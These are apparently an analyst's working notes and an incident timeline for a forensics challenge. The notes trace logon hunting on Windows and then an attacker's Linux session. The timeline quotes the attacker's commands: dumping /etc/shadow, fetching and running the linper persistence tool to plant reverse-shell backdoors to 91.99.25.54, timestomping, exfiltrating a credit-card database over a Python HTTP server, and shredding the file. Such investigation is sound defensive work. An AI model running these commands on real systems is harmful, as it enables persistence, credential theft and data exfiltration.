
**Previously in Prison Break**

- **When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file?**
    *2025-08-20 10:08:06*
- The attacker created a persistence mechanism on the workstation. When was the persistence setup?
	*2025-08-20 10:13:57*

- When did the malicious RMM session end?
	*2025-08-20 10:14:27*

Parisng the disk image using Cape with the module EZPasrer

![[Pasted image 20260521020234.png]]

What was the first (non cd) command executed by the attacker on the host?
Last time the attacker moved laterally from the machine central cogwork to Heise-9
So we will hunt first the attacker logon event to correlate time because the last recorded time is 	*2025-08-20 10:14:27*

We search for remote successful logins of the  user Werni,  from the machine 10.129.242.110

`To Detail`
We notice that the authentification package was NTLM `Weak protocol`

![[Pasted image 20260521033427.png]]



searching FOR 4688 event id logs and the user werner 









## Timeline Events



| Time            | Event                                                                                                                                              | Evidence                                                                                                                        |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **10:39:28**    | The attacker Sucecssfully logged in using the credentials from the exfiltrated file  to `Heisen-9-WS-6` from `10.129.242.110`                      | TCP stream fragments `.131 → .136` containing `USER -f root` payload; resulting shell on `pts/1` with env `DISPLAY=kali:0.0`    |
| ~10:39–10:40    | Initial recon: `id`, `ps`, `cd /root; ls -la`                                                                                                      | Stream                                                                                                                          |
| ~10:42          |                                                                                                                                                    | New `/etc/shadow` entry; yescrypt hash; age field 20480 = 2026-01-27                                                            |
| ~10:42          | Credential dump: `cat /etc/shadow`                                                                                                                 | Full shadow file echoed in stream                                                                                               |
| ~10:43          | Filesystem enumeration: `/`, `/media`, `/dev`, `/opt`                                                                                              | `ls -la` output                                                                                                                 |
| ~10:43          | Sensitive file located: `/opt/credit-cards-25-blackfriday.db` (12 288 B, mtime 2026-01-26 14:05)                                                   | Directory listing                                                                                                               |
| **10:44:31–32** | Persistence tool fetched: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` to `/tmp`                        | wget output (34 249 B)                                                                                                          |
| ~10:45          | `bash linper.sh --enum-defenses` — Tripwire enumeration (none found)                                                                               | Tool output                                                                                                                     |
| ~10:45–10:46    | `bash linper.sh -i 91.99.25.54 -p 59 --stealth-mode` — multi-method persistence to `91.99.25.54:59` via awk, bash, nc, perl, pwsh, python3, telnet | Tool output: doors written to `/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local` |
| ~10:46          | Timestomping of every modified persistence file                                                                                                    | linper output: "Timestomped Door" per file                                                                                      |
| ~10:49          | Exfil staging: `python3 -m http.server 6932` from `/opt`                                                                                           | "Serving HTTP on 0.0.0.0 port 6932"                                                                                             |
| **10:49:52**    | Attacker host `192.168.72.131` reaches listener (`GET /` → 200)                                                                                    | HTTP server access log                                                                                                          |
| **10:49:54**    | **Exfiltration:** `192.168.72.131 — GET /credit-cards-25-blackfriday.db → 200`                                                                     | HTTP server access log                                                                                                          |
| ~10:50          | HTTP server stopped (`Ctrl+C`)                                                                                                                     | Stream                                                                                                                          |
| ~10:53          | Anti-forensics: `shred -u -z -n 4 -- credit-cards-25-blackfriday.db`                                                                               | `ls -la /opt` confirms removal; `/opt` mtime updates to 10:53                                                                   |
| ~10:53          | Session terminated (`exit`)                                                                                                                        | Stream end                                                                                                                      |
##